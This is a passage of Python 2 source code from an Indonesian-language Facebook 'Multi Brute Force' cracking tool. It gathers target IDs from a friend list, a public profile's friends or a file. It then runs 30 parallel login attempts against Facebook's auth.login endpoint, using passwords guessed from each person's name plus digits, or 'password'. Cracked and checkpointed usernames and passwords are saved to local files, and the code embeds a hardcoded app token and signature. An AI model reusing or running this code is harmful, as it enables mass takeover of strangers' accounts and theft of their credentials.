                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/viet.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/viet.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone viet.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_israel():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;94m _________   ________.    '
    print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;91m  \\______  /|__|   |___  /'
    print '\x1b[1;94m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mIsrael\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_israel()


def pilih_israel():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_israel()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;94m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK ISRAEL \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;94m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK ISRAEL \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_israel()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;94m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK ISRAEL \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_israel()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_israel()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/israel.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/israel.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/israel.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/israel.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/israel.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/israel.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'password'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/israel.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/israel.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/israel.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/israel.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/israel.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/israel.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '1234'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/israel.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/israel.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/israel.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/israel.txt', 'a')
